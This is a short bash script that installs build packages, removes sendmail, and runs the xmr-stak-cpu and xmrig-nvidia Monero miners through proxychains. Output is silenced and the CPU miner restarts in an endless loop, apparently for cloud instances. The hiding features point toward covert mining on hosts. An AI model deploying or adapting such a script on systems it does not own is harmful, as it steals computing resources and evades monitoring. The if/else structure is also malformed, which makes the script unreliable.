#!/bin/bash
sudo yum remove sendmail -y
sudo yum install git build-essential automake libjansson-dev libgmp-dev libcurl4-openssl-dev libssl-dev pthreads zlib openssl-devel gcc-c++ curl-devel libmpc-devel gmp  gmp-devel  mpfr  mpfr-devel  libmpc  libmpc-devel -y
#rm -rf /var/lib/cloud/instance/*

  sudo apt-get remove sendmail -y
  sudo apt-get install git build-essential automake libjansson-dev libgmp-dev libcurl4-openssl-dev libssl-dev pthreads zlib openssl-devel gcc-c++ curl-devel libmpc-devel gmp  gmp-devel  mpfr  mpfr-devel  libmpc  libmpc-devel -y
  sudo chmod +x /m/test01/proxychains/proxychains4
  sudo chmod +x /m/test01/xmr/xmr-stak-cpu
  sudo chmod +x /m/test01/proxychains/libproxychains4.so
  # Placeholder for ProxyChains Update from Boot Strap Variables
	# sudo sed -i 's/socks4/#http/' /m/test01/proxychains-ng/src/proxychains.conf
	# sudo sed -i -e "\$ahttp    $VAR_PI    $VAR_PO    $VAR_PO  $VAR_PP" /m/test01/proxychains-ng/src/proxychains.conf
  #( sleep 86400 ; sudo reboot ) & 
  cd /m/test01/xmr
  
  if [ -f "/m/test01/xmr/config.aws$cores" ]
  	then
  sudo cp /m/test01/xmr/config.aws$cores /m/test01/xmr/config.txt
    	else
  sudo cp /m/test01/xmr/config.aws /m/test01/xmr/config.txt
 
  #
  
cd /m/test01/xmrig-nvidia/build
sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmrig-nvidia/build/xmrig-nvidia --config=config.json>/dev/null 2>&1&  
  
fi
while true; do
sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
done
